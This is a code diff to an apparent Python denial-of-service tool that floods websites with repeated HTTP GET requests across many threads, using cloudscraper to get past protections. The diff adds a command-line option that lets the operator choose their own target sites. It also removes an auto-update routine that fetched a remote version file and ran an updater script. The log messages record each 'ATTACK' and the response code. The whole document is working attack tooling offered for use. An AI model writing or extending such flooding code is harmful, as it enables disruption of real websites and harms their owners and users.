@@ -41,6 +41,7 @@ parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
 parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
 parser.add_argument("-lo", "--logger-output", dest="logger_output")
 parser.add_argument("-lr", "--logger-results", dest="logger_results")
+parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
 parser.set_defaults(no_clear=False)
 parser.set_defaults(proxy_view=False)
 parser.set_defaults(logger_output=stderr)
@@ -49,6 +50,7 @@ args, unknown = parser.parse_known_args()
 no_clear = args.no_clear
 proxy_view = args.proxy_view
 threads = int(args.threads)
+targets = args.targets
 
 logger.remove()
 logger.add(
@@ -67,31 +69,6 @@ def checkReq():
     os.system("python -m pip install -r requirements.txt")
     os.system("pip install -r requirements.txt")
     os.system("pip3 install -r requirements.txt")
-
-
-def checkUpdate():
-    logger.info("Checking Updates...")
-    updateScraper = cloudscraper.create_scraper(
-        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
-    url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
-    try:
-        content = updateScraper.get(url).content
-        if content:
-            data = json.loads(content)
-            new_version = data["version"]
-            logger.info("Version: ", new_version)
-            if int(new_version) > int(VERSION):
-                logger.info("New version Available")
-                os.system("python updater.py " + str(threads))
-                os.system("python3 updater.py " + str(threads))
-                exit()
-        else:
-            sleep(5)
-            checkUpdate()
-    except:
-        sleep(5)
-        checkUpdate()
-
 
 def mainth():
     result = 'processing'
@@ -122,10 +99,8 @@ def mainth():
         else:
             sleep(5)
             continue
-        logger.info("STARTING ATTACK ON " + data['site']['page'])
-        site = unquote(data['site']['page'])
-        if site.startswith('http') == False:
-            site = "https://" + site
+        site = unquote(choice(targets) if targets else data['site']['page'])
+        logger.info("STARTING ATTACK TO " + site)
 
         attacks_number = 0
 
@@ -143,13 +118,13 @@ def mainth():
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
                             attacks_number += 1
-                            logger.info("ATTACKED; RESPONSE CODE: " +
+                            logger.info("ATTACKED {}; SITE: {}; RESPONSE CODE: ".format(i, site) +
                                         str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
                     attacks_number += 1
-                    logger.info("ATTACKED; RESPONSE CODE: " +
+                    logger.info("ATTACKED {}; SITE: {}; RESPONSE CODE: ".format(i, site) +
                                 str(response.status_code))
             if attacks_number > 0:
                 logger.success("SUCCESSFUL ATTACKS on" + site + ": " + str(attacks_number))
@@ -166,7 +141,6 @@ def mainth():
 def cleaner():
     while True:
         sleep(60)
-        checkUpdate()
 
         if not no_clear:
             clear()
@@ -177,7 +151,6 @@ if __name__ == '__main__':
     if not no_clear:
         clear()
     checkReq()
-    checkUpdate()
     Thread(target=cleaner, daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=threads) as executor:
